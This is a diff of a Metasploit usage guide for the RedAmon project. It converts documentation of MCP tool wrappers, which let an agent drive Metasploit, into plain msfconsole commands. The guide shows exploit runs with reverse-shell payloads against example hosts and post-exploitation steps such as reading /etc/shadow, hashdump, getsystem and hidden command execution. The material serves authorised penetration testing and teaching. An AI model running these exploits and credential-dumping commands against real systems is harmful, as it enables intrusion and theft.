@@ -8,14 +8,13 @@ This guide covers everything you need to know about using Metasploit Framework t
 2. [When to Use Metasploit (in RedAmon Workflow)](#when-to-use-metasploit-in-redamon-workflow)
 3. [Getting Started](#getting-started)
 4. [Understanding Modules](#understanding-modules)
-5. [MCP Server Tools Reference](#mcp-server-tools-reference)
-   - [metasploit_search](#1-metasploit_search)
-   - [metasploit_info](#2-metasploit_info)
-   - [metasploit_module_payloads](#3-metasploit_module_payloads)
-   - [metasploit_payload_info](#4-metasploit_payload_info)
-   - [metasploit_exploit](#5-metasploit_exploit)
-   - [metasploit_sessions](#6-metasploit_sessions)
-   - [metasploit_session_interact](#7-metasploit_session_interact)
+5. [Metasploit Operations Reference](#metasploit-operations-reference)
+   - [Searching for Modules](#searching-for-modules)
+   - [Getting Module Information](#getting-module-information)
+   - [Working with Payloads](#working-with-payloads)
+   - [Running Exploits](#running-exploits)
+   - [Managing Sessions](#managing-sessions)
+   - [Session Interaction](#session-interaction)
 6. [Terminal Commands Reference](#terminal-commands-reference)
 7. [Common Workflows](#common-workflows)
 8. [Post-Exploitation](#post-exploitation)
@@ -173,21 +172,15 @@ Examples:
 
 ---
 
-## MCP Server Tools Reference
+## Metasploit Operations Reference
 
-These are the tools exposed by the RedAmon Metasploit MCP server. Each maps to msfconsole commands.
+This section covers the core operations available in Metasploit Framework.
 
-### 1. metasploit_search
+### Searching for Modules
 
 **Purpose:** Find modules in the Metasploit database.
 
-**What it does:** Searches through all 4,000+ modules to find exploits, auxiliaries, or payloads matching your query.
-
-#### Arguments
-
-| Argument | Type | Required | Description |
-|----------|------|----------|-------------|
-| `query` | string | Yes | Search query with optional filters |
+Metasploit contains 4,000+ modules. Use search to find exploits, auxiliaries, or payloads matching your query.
 
 #### Search Syntax
 
@@ -230,18 +223,18 @@ type:exploit platform:linux rank:excellent http
 
 #### Examples
 
-```python
+```bash
 # Find exploits for a CVE found by Nuclei
-metasploit_search("CVE-2021-41773")
+search CVE-2021-41773
 
 # Find HTTP scanners
-metasploit_search("type:auxiliary scanner http")
+search type:auxiliary scanner http
 
 # Find WordPress exploits
-metasploit_search("type:exploit wordpress")
+search type:exploit wordpress
 
 # Find excellent-ranked Windows exploits
-metasploit_search("type:exploit platform:windows rank:excellent")
+search type:exploit platform:windows rank:excellent
 ```
 
 #### Understanding the Output
@@ -259,7 +252,7 @@ Matching Modules
 | Column | Meaning |
 |--------|---------|
 | # | Index number |
-| Name | Full module path (use this with `metasploit_info`) |
+| Name | Full module path (use this with the `info` command) |
 | Disclosure Date | When the vulnerability was publicly disclosed |
 | Rank | Reliability rating |
 | Check | Whether the module can check without exploiting (safe test) |
@@ -267,29 +260,27 @@ Matching Modules
 
 ---
 
-### 2. metasploit_info
+### Getting Module Information
 
 **Purpose:** Get detailed information about a specific module.
 
-**What it does:** Shows everything about a module: what it exploits, what options you need to set, what targets it supports, references, and authors.
-
-#### Arguments
-
-| Argument | Type | Required | Description |
-|----------|------|----------|-------------|
-| `module_name` | string | Yes | Full module path from search results |
+Use the `info` command to see everything about a module: what it exploits, what options you need to set, what targets it supports, references, and authors.
 
 #### Examples
 
-```python
+```bash
 # Get info on Apache path traversal exploit
-metasploit_info("exploit/multi/http/apache_normalize_path_rce")
+info exploit/multi/http/apache_normalize_path_rce
 
 # Get info on EternalBlue
-metasploit_info("exploit/windows/smb/ms17_010_eternalblue")
+info exploit/windows/smb/ms17_010_eternalblue
 
 # Get info on an auxiliary scanner
-metasploit_info("auxiliary/scanner/http/http_version")
+info auxiliary/scanner/http/http_version
+
+# Or first select the module, then use info
+use exploit/multi/http/apache_normalize_path_rce
+info
 ```
 
 #### Understanding the Output
@@ -344,26 +335,24 @@ References:
 
 ---
 
-### 3. metasploit_module_payloads
+### Working with Payloads
 
 **Purpose:** List all payloads compatible with an exploit.
 
-**What it does:** Shows which payloads work with a specific exploit module. Different exploits support different payload types based on target OS and architecture.
-
-#### Arguments
-
-| Argument | Type | Required | Description |
-|----------|------|----------|-------------|
-| `module_name` | string | Yes | Full exploit module path |
+Use `show payloads` to see which payloads work with a specific exploit module. Different exploits support different payload types based on target OS and architecture.
 
 #### Examples
 
-```python
-# See what payloads work with Apache exploit
-metasploit_module_payloads("exploit/multi/http/apache_normalize_path_rce")
+```bash
+# First select an exploit module
+use exploit/multi/http/apache_normalize_path_rce
 
-# See Windows payload options
-metasploit_module_payloads("exploit/windows/smb/ms17_010_eternalblue")
+# Then see what payloads work with it
+show payloads
+
+# For Windows exploits
+use exploit/windows/smb/ms17_010_eternalblue
+show payloads
 ```
 
 #### Understanding the Output
@@ -392,31 +381,27 @@ Compatible Payloads
 | `*_bind_tcp` | You connect to target (use when target can't reach you) |
 | `*_reverse_https` | Encrypted connection, harder to detect |
 
----
-
-### 4. metasploit_payload_info
+#### Payload Information
 
 **Purpose:** Get detailed information about a specific payload.
 
-**What it does:** Shows payload description, required options (LHOST, LPORT), platform compatibility, and architecture requirements.
-
-#### Arguments
-
-| Argument | Type | Required | Description |
-|----------|------|----------|-------------|
-| `payload_name` | string | Yes | Full payload path (without `payload/` prefix) |
+Use the `info` command on a payload to see its description, required options (LHOST, LPORT), platform compatibility, and architecture requirements.
 
 #### Examples
 
-```python
+```bash
 # Get info on Linux Meterpreter
-metasploit_payload_info("linux/x64/meterpreter/reverse_tcp")
+info payload/linux/x64/meterpreter/reverse_tcp
 
 # Get info on Windows reverse shell
-metasploit_payload_info("windows/x64/shell_reverse_tcp")
+info payload/windows/x64/shell_reverse_tcp
 
 # Get info on simple bash reverse shell
-metasploit_payload_info("cmd/unix/reverse_bash")
+info payload/cmd/unix/reverse_bash
+
+# Or set the payload first, then use info
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+info
 ```
 
 #### Understanding the Output
@@ -452,47 +437,44 @@ Description:
 
 ---
 
-### 5. metasploit_exploit
+### Running Exploits
 
 **Purpose:** Execute an exploit with a payload against a target.
 
-**What it does:** Configures and launches an exploitation attempt. If successful, creates a session (shell access) to the target.
+Configure the module options and launch the exploitation attempt. If successful, it creates a session (shell access) to the target.
 
-#### Arguments
+#### Required Configuration
 
-| Argument | Type | Required | Description |
-|----------|------|----------|-------------|
-| `module` | string | Yes | Exploit module path (without `exploit/` prefix) |
-| `rhosts` | string | Yes | Target IP address or hostname |
-| `rport` | integer | Yes | Target port number |
-| `payload` | string | Yes | Payload to deliver |
-| `lhost` | string | Yes | Your IP address (for reverse connection) |
-| `lport` | integer | Yes | Your listening port |
-| `extra_options` | string | No | Additional options as "KEY=VALUE; KEY2=VALUE2" |
+| Option | Description |
+|--------|-------------|
+| `RHOSTS` | Target IP address or hostname |
+| `RPORT` | Target port number |
+| `PAYLOAD` | Payload to deliver |
+| `LHOST` | Your IP address (for reverse connection) |
+| `LPORT` | Your listening port |
 
 #### Examples
 
-```python
-# Basic exploitation
-metasploit_exploit(
-    module="multi/http/apache_normalize_path_rce",
-    rhosts="10.0.0.5",
-    rport=443,
-    payload="linux/x64/meterpreter/reverse_tcp",
-    lhost="10.0.0.10",
-    lport=4444
-)
+```bash
+# Basic exploitation workflow
+use exploit/multi/http/apache_normalize_path_rce
+set RHOSTS 10.0.0.5
+set RPORT 443
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.10
+set LPORT 4444
+exploit
 
 # With extra options
-metasploit_exploit(
-    module="multi/http/apache_normalize_path_rce",
-    rhosts="10.0.0.5",
-    rport=8080,
-    payload="cmd/unix/reverse_bash",
-    lhost="10.0.0.10",
-    lport=4444,
-    extra_options="SSL=false; TARGETURI=/cgi-bin"
-)
+use exploit/multi/http/apache_normalize_path_rce
+set RHOSTS 10.0.0.5
+set RPORT 8080
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST 10.0.0.10
+set LPORT 4444
+set SSL false
+set TARGETURI /cgi-bin
+exploit
 ```
 
 #### Understanding the Output
@@ -532,21 +514,29 @@ Active sessions
 
 ---
 
-### 6. metasploit_sessions
+### Managing Sessions
 
 **Purpose:** List all active sessions (compromised systems).
 
-**What it does:** Shows all current connections to compromised targets, including session type, user context, and connection details.
-
-#### Arguments
-
-None - this command takes no arguments.
+Use the `sessions` command to see all current connections to compromised targets, including session type, user context, and connection details.
 
 #### Examples
 
-```python
-# Check what sessions you have
-metasploit_sessions()
+```bash
+# List all active sessions
+sessions
+
+# List with details
+sessions -l
+
+# Interact with a specific session
+sessions -i 1
+
+# Kill a specific session
+sessions -k 1
+
+# Kill all sessions
+sessions -K
 ```
 
 #### Understanding the Output
@@ -563,91 +553,99 @@ Active sessions
 
 | Column | Meaning |
 |--------|---------|
-| Id | Session number - use this with `metasploit_session_interact` |
+| Id | Session number - use this with `sessions -i <id>` |
 | Type | `meterpreter` (advanced) or `shell` (basic) |
 | Information | Username @ hostname |
 | Connection | Your_IP:port -> Target_IP:port |
 
 ---
 
-### 7. metasploit_session_interact
+### Session Interaction
 
 **Purpose:** Execute commands on a compromised system.
 
-**What it does:** Sends commands to an active session and returns the output. Different commands work depending on whether it's a shell or meterpreter session.
+Use `sessions -i <id>` to interact with an active session. Different commands work depending on whether it's a shell or meterpreter session.
 
-#### Arguments
+#### How to Interact
 
-| Argument | Type | Required | Description |
-|----------|------|----------|-------------|
-| `session_id` | integer | Yes | Session ID from metasploit_sessions() |
-| `command` | string | Yes | Command to execute |
-| `timeout` | integer | No | Command timeout in seconds (default: 30) |
+```bash
+# Enter an interactive session
+sessions -i 1
+
+# You're now inside the session
+# Use 'background' to return to msfconsole
+# Use Ctrl+Z as alternative to background
+
+# From within meterpreter, run shell commands
+meterpreter > shell
+# Or execute directly
+meterpreter > execute -f cmd.exe -i -H
+```
 
 #### Shell Session Commands
 
 For basic shell sessions (type: `shell`), use standard Linux/Windows commands:
 
-```python
+```bash
 # Linux shell commands
-metasploit_session_interact(1, "whoami")           # Current user
-metasploit_session_interact(1, "id")               # User ID and groups
-metasploit_session_interact(1, "uname -a")         # System info
-metasploit_session_interact(1, "cat /etc/passwd")  # User accounts
-metasploit_session_interact(1, "cat /etc/shadow")  # Password hashes (needs root)
-metasploit_session_interact(1, "netstat -tlnp")    # Network connections
-metasploit_session_interact(1, "ps aux")           # Running processes
-metasploit_session_interact(1, "ls -la /home")     # List home directories
-metasploit_session_interact(1, "cat /etc/crontab") # Scheduled tasks
-metasploit_session_interact(1, "find / -perm -4000 2>/dev/null")  # SUID binaries
+whoami              # Current user
+id                  # User ID and groups
+uname -a            # System info
+cat /etc/passwd     # User accounts
+cat /etc/shadow     # Password hashes (needs root)
+netstat -tlnp       # Network connections
+ps aux              # Running processes
+ls -la /home        # List home directories
+cat /etc/crontab    # Scheduled tasks
+find / -perm -4000 2>/dev/null  # SUID binaries
 
 # Windows shell commands
-metasploit_session_interact(1, "whoami /all")      # Current user with privileges
-metasploit_session_interact(1, "systeminfo")       # System information
-metasploit_session_interact(1, "net user")         # User accounts
-metasploit_session_interact(1, "net localgroup administrators")  # Admin users
-metasploit_session_interact(1, "ipconfig /all")    # Network configuration
-metasploit_session_interact(1, "tasklist")         # Running processes
-metasploit_session_interact(1, "netstat -ano")     # Network connections
+whoami /all                        # Current user with privileges
+systeminfo                         # System information
+net user                           # User accounts
+net localgroup administrators      # Admin users
+ipconfig /all                      # Network configuration
+tasklist                           # Running processes
+netstat -ano                       # Network connections
 ```
 
 #### Meterpreter Commands
 
 For meterpreter sessions (type: `meterpreter`), use meterpreter-specific commands:
 
-```python
+```bash
 # System information
-metasploit_session_interact(1, "sysinfo")          # Detailed system info
-metasploit_session_interact(1, "getuid")           # Current user
-metasploit_session_interact(1, "getpid")           # Current process ID
-metasploit_session_interact(1, "ps")               # Process list
+sysinfo          # Detailed system info
+getuid           # Current user
+getpid           # Current process ID
+ps               # Process list
 
 # File operations
-metasploit_session_interact(1, "pwd")              # Current directory
-metasploit_session_interact(1, "ls")               # List files
-metasploit_session_interact(1, "cat /etc/passwd")  # Read file
-metasploit_session_interact(1, "download /etc/passwd /opt/output/")  # Download file
-metasploit_session_interact(1, "upload /opt/tools/linpeas.sh /tmp/")  # Upload file
+pwd              # Current directory
+ls               # List files
+cat /etc/passwd  # Read file
+download /etc/passwd /opt/output/  # Download file
+upload /opt/tools/linpeas.sh /tmp/ # Upload file
 
 # Privilege escalation
-metasploit_session_interact(1, "getsystem")        # Attempt to get SYSTEM (Windows)
-metasploit_session_interact(1, "hashdump")         # Dump password hashes
+getsystem        # Attempt to get SYSTEM (Windows)
+hashdump         # Dump password hashes
 
 # Network
-metasploit_session_interact(1, "ipconfig")         # Network interfaces
-metasploit_session_interact(1, "route")            # Routing table
-metasploit_session_interact(1, "arp")              # ARP table
-metasploit_session_interact(1, "portfwd add -l 8080 -p 80 -r 192.168.1.100")  # Port forward
+ipconfig         # Network interfaces
+route            # Routing table
+arp              # ARP table
+portfwd add -l 8080 -p 80 -r 192.168.1.100  # Port forward
 
 # Shell access
-metasploit_session_interact(1, "shell")            # Drop to system shell
-metasploit_session_interact(1, "execute -f cmd.exe -i -H")  # Execute hidden command
+shell            # Drop to system shell
+execute -f cmd.exe -i -H  # Execute hidden command
 ```
 
-#### Understanding the Output
+#### Example Session Output
 
-```python
->>> metasploit_session_interact(1, "sysinfo")
+```
+meterpreter > sysinfo
 
 Computer        : webserver
 OS              : Ubuntu 20.04 (Linux 5.4.0-42-generic)
